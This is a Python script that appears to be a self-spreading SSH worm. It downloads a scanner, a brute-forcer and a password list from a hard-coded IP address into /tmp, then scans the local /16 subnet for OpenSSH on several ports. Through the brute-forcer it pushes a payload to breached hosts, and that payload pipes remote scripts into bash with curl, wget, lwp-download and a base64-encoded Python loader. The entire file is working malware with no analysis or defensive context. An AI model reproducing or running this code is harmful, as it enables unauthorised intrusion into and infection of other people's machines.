import urllib
import platform
import os

payload = 'curl -s http://205.185.116.78/xms | bash -sh; wget -q -O - http://205.185.116.78/xms | bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly8yMDUuMTg1LjExNi43OC9kLnB5IikucmVhZCgpKSc= | base64 -d | bash -; lwp-download http://205.185.116.78/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms'
lan = "ip a | grep 'BROADCAST\|inet' | grep -oP 'inet\s+\K\d{1,3}\.\d{1,3}' | grep -v 127 | grep -v inet6 |grep -v 255 | head -n1"

if platform.architecture()[0] == "64bit":
	urlx64 = "http://205.185.116.78/hxx"
	urlxx = "http://205.185.116.78/p"
	urlxxx = "http://205.185.116.78/scan"
	try:
		f = urllib.urlopen(urlx64)
		if f.code == 200:
			data = f.read()
			with open ("/tmp/hxx", "wb") as code:
				code.write(data)
		xx = urllib.urlopen(urlxx)
		if xx.code == 200:
			data = xx.read()
			with open ("/tmp/p", "wb") as code:
				code.write(data)
		xxx = urllib.urlopen(urlxxx)
		if xxx.code == 200:
			data = xxx.read()
			with open ("/tmp/scan", "wb") as code:
				code.write(data)

		os.chmod("/tmp/hxx", 0o777)
		os.chmod("/tmp/p", 0o777)
		os.chmod("/tmp/scan", 0o777)
		os.system("cd /tmp")
		os.system("rm -rf /tmp/ssh_vuln.txt")
		os.system("nohup /tmp/scan `ip a | grep 'BROADCAST\|inet' | grep -oP 'inet\s+\K\d{1,3}\.\d{1,3}' | grep -v 127 | grep -v inet6 |grep -v 255 | head -n1`.0.0-`ip a | grep 'BROADCAST\|inet' | grep -oP 'inet\s+\K\d{1,3}\.\d{1,3}' | grep -v 127 | grep -v inet6 |grep -v 255 | head -n1`.255.255 22 > /tmp/ssh_vuln.txt")
		os.system("cat /tmp/ssh_vuln.txt | grep 'OpenSSH' | awk '{print $1}' | uniq | shuf > /tmp/sshcheck; rm -rf /tmp/ssh_vuln.txt")
		os.system("nohup /tmp/hxx 300 -f /tmp/sshcheck /tmp/p 22 " + "'" + payload + "' >/dev/null 2>&1")
		os.system("echo Finished")
		os.system("pkill -9 hxx")
		os.system("nohup /tmp/scan `ip a | grep 'BROADCAST\|inet' | grep -oP 'inet\s+\K\d{1,3}\.\d{1,3}' | grep -v 127 | grep -v inet6 |grep -v 255 | head -n1`.0.0-`ip a | grep 'BROADCAST\|inet' | grep -oP 'inet\s+\K\d{1,3}\.\d{1,3}' | grep -v 127 | grep -v inet6 |grep -v 255 | head -n1`.255.255 222 > /tmp/ssh_vuln.txt")
		os.system("cat /tmp/ssh_vuln.txt | grep 'OpenSSH' | awk '{print $1}' | uniq | shuf > /tmp/sshcheck; rm -rf /tmp/ssh_vuln.txt")
		os.system("nohup /tmp/hxx 300 -f /tmp/sshcheck /tmp/p 222 " + "'" + payload + "' >/dev/null 2>&1")
		os.system("echo Finished")
		os.system("pkill -9 hxx")
		os.system("nohup /tmp/scan `ip a | grep 'BROADCAST\|inet' | grep -oP 'inet\s+\K\d{1,3}\.\d{1,3}' | grep -v 127 | grep -v inet6 |grep -v 255 | head -n1`.0.0-`ip a | grep 'BROADCAST\|inet' | grep -oP 'inet\s+\K\d{1,3}\.\d{1,3}' | grep -v 127 | grep -v inet6 |grep -v 255 | head -n1`.255.255 2222 > /tmp/ssh_vuln.txt")
		os.system("cat /tmp/ssh_vuln.txt | grep 'OpenSSH' | awk '{print $1}' | uniq | shuf > /tmp/sshcheck; rm -rf /tmp/ssh_vuln.txt")
		os.system("nohup /tmp/hxx 300 -f /tmp/sshcheck /tmp/p 2222 " + "'" + payload + "' >/dev/null 2>&1")
		os.system("echo Finished")
		os.system("pkill -9 hxx")
		os.system("nohup /tmp/scan `ip a | grep 'BROADCAST\|inet' | grep -oP 'inet\s+\K\d{1,3}\.\d{1,3}' | grep -v 127 | grep -v inet6 |grep -v 255 | head -n1`.0.0-`ip a | grep 'BROADCAST\|inet' | grep -oP 'inet\s+\K\d{1,3}\.\d{1,3}' | grep -v 127 | grep -v inet6 |grep -v 255 | head -n1`.255.255 22222 > /tmp/ssh_vuln.txt")
		os.system("cat /tmp/ssh_vuln.txt | grep 'OpenSSH' | awk '{print $1}' | uniq | shuf > /tmp/sshcheck; rm -rf /tmp/ssh_vuln.txt")
		os.system("nohup /tmp/hxx 300 -f /tmp/sshcheck /tmp/p 22222 " + "'" + payload + "' >/dev/null 2>&1")
		os.system("echo Finished")
		os.system("pkill -9 hxx")
		os.system("nohup /tmp/scan `ip a | grep 'BROADCAST\|inet' | grep -oP 'inet\s+\K\d{1,3}\.\d{1,3}' | grep -v 127 | grep -v inet6 |grep -v 255 | head -n1`.0.0-`ip a | grep 'BROADCAST\|inet' | grep -oP 'inet\s+\K\d{1,3}\.\d{1,3}' | grep -v 127 | grep -v inet6 |grep -v 255 | head -n1`.255.255 222222 > /tmp/ssh_vuln.txt")
		os.system("cat /tmp/ssh_vuln.txt | grep 'OpenSSH' | awk '{print $1}' | uniq | shuf > /tmp/sshcheck; rm -rf /tmp/ssh_vuln.txt")
		os.system("nohup /tmp/hxx 300 -f /tmp/sshcheck /tmp/p 222222 " + "'" + payload + "' >/dev/null 2>&1")
		os.system("echo Finished")
		os.system("pkill -9 hxx")
		#os.system("nohup /tmp/scan `ip a | grep 'BROADCAST\|inet' | grep -oP 'inet\s+\K\d{1,3}\.\d{1,3}' | grep -v 127 | grep -v inet6 |grep -v 255 | head -n1`.0.0-`ip a | grep 'BROADCAST\|inet' | grep -oP 'inet\s+\K\d{1,3}\.\d{1,3}' | grep -v 127 | grep -v inet6 |grep -v 255 | head -n1`.255.255 22 > /tmp/ssh_vuln.txt")
	except:
		pass
else:
	urlx32 = "http://205.185.116.78/hxx"
	urlyy = "http://205.185.116.78/p"
	urlyyy = "http://205.185.116.78/scan"
	try:
		f = urllib.urlopen(urlx64)
		if f.code == 200:
			data = f.read()
			with open ("/tmp/hxx", "wb") as code:
				code.write(data)
		yy = urllib.urlopen(urlyy)
		if yy.code == 200:
			data = yy.read()
			with open ("/tmp/p", "wb") as code:
				code.write(data)
		yyy = urllib.urlopen(urlyyy)
		if yyy.code == 200:
			data = yyy.read()
			with open ("/tmp/scan", "wb") as code:
				code.write(data)

		os.chmod("/tmp/hxx", 0o777)
		os.chmod("/tmp/p", 0o777)
		os.chmod("/tmp/scan", 0o777)
		os.system("cd /tmp")
		os.system("rm -rf /tmp/ssh_vuln.txt")
		os.system("nohup /tmp/scan `ip a | grep 'BROADCAST\|inet' | grep -oP 'inet\s+\K\d{1,3}\.\d{1,3}' | grep -v 127 | grep -v inet6 |grep -v 255 | head -n1`.0.0-`ip a | grep 'BROADCAST\|inet' | grep -oP 'inet\s+\K\d{1,3}\.\d{1,3}' | grep -v 127 | grep -v inet6 |grep -v 255 | head -n1`.255.255 22 > /tmp/ssh_vuln.txt")
		os.system("cat /tmp/ssh_vuln.txt | grep 'OpenSSH' | awk '{print $1}' | uniq | shuf > /tmp/sshcheck; rm -rf /tmp/ssh_vuln.txt")
		os.system("nohup /tmp/hxx 300 -f /tmp/sshcheck /tmp/p 22 " + "'" + payload + "' >/dev/null 2>&1")
		os.system("echo Finished")
		os.system("pkill -9 hxx")
		os.system("nohup /tmp/scan `ip a | grep 'BROADCAST\|inet' | grep -oP 'inet\s+\K\d{1,3}\.\d{1,3}' | grep -v 127 | grep -v inet6 |grep -v 255 | head -n1`.0.0-`ip a | grep 'BROADCAST\|inet' | grep -oP 'inet\s+\K\d{1,3}\.\d{1,3}' | grep -v 127 | grep -v inet6 |grep -v 255 | head -n1`.255.255 222 > /tmp/ssh_vuln.txt")
		os.system("cat /tmp/ssh_vuln.txt | grep 'OpenSSH' | awk '{print $1}' | uniq | shuf > /tmp/sshcheck; rm -rf /tmp/ssh_vuln.txt")
		os.system("nohup /tmp/hxx 300 -f /tmp/sshcheck /tmp/p 222 " + "'" + payload + "' >/dev/null 2>&1")
		os.system("echo Finished")
		os.system("pkill -9 hxx")
		os.system("nohup /tmp/scan `ip a | grep 'BROADCAST\|inet' | grep -oP 'inet\s+\K\d{1,3}\.\d{1,3}' | grep -v 127 | grep -v inet6 |grep -v 255 | head -n1`.0.0-`ip a | grep 'BROADCAST\|inet' | grep -oP 'inet\s+\K\d{1,3}\.\d{1,3}' | grep -v 127 | grep -v inet6 |grep -v 255 | head -n1`.255.255 2222 > /tmp/ssh_vuln.txt")
		os.system("cat /tmp/ssh_vuln.txt | grep 'OpenSSH' | awk '{print $1}' | uniq | shuf > /tmp/sshcheck; rm -rf /tmp/ssh_vuln.txt")
		os.system("nohup /tmp/hxx 300 -f /tmp/sshcheck /tmp/p 2222 " + "'" + payload + "' >/dev/null 2>&1")
		os.system("echo Finished")
		os.system("pkill -9 hxx")
		os.system("nohup /tmp/scan `ip a | grep 'BROADCAST\|inet' | grep -oP 'inet\s+\K\d{1,3}\.\d{1,3}' | grep -v 127 | grep -v inet6 |grep -v 255 | head -n1`.0.0-`ip a | grep 'BROADCAST\|inet' | grep -oP 'inet\s+\K\d{1,3}\.\d{1,3}' | grep -v 127 | grep -v inet6 |grep -v 255 | head -n1`.255.255 22222 > /tmp/ssh_vuln.txt")
		os.system("cat /tmp/ssh_vuln.txt | grep 'OpenSSH' | awk '{print $1}' | uniq | shuf > /tmp/sshcheck; rm -rf /tmp/ssh_vuln.txt")
		os.system("nohup /tmp/hxx 300 -f /tmp/sshcheck /tmp/p 22222 " + "'" + payload + "' >/dev/null 2>&1")
		os.system("echo Finished")
		os.system("pkill -9 hxx")
		os.system("nohup /tmp/scan `ip a | grep 'BROADCAST\|inet' | grep -oP 'inet\s+\K\d{1,3}\.\d{1,3}' | grep -v 127 | grep -v inet6 |grep -v 255 | head -n1`.0.0-`ip a | grep 'BROADCAST\|inet' | grep -oP 'inet\s+\K\d{1,3}\.\d{1,3}' | grep -v 127 | grep -v inet6 |grep -v 255 | head -n1`.255.255 222222 > /tmp/ssh_vuln.txt")
		os.system("cat /tmp/ssh_vuln.txt | grep 'OpenSSH' | awk '{print $1}' | uniq | shuf > /tmp/sshcheck; rm -rf /tmp/ssh_vuln.txt")
		os.system("nohup /tmp/hxx 300 -f /tmp/sshcheck /tmp/p 222222 " + "'" + payload + "' >/dev/null 2>&1")
		os.system("echo Finished")
		os.system("pkill -9 hxx")
		#os.system("nohup /tmp/scan `ip a | grep 'BROADCAST\|inet' | grep -oP 'inet\s+\K\d{1,3}\.\d{1,3}' | grep -v 127 | grep -v inet6 |grep -v 255 | head -n1`.0.0-`ip a | grep 'BROADCAST\|inet' | grep -oP 'inet\s+\K\d{1,3}\.\d{1,3}' | grep -v 127 | grep -v inet6 |grep -v 255 | head -n1`.255.255 22 > /tmp/ssh_vuln.txt")
	except:
		pass
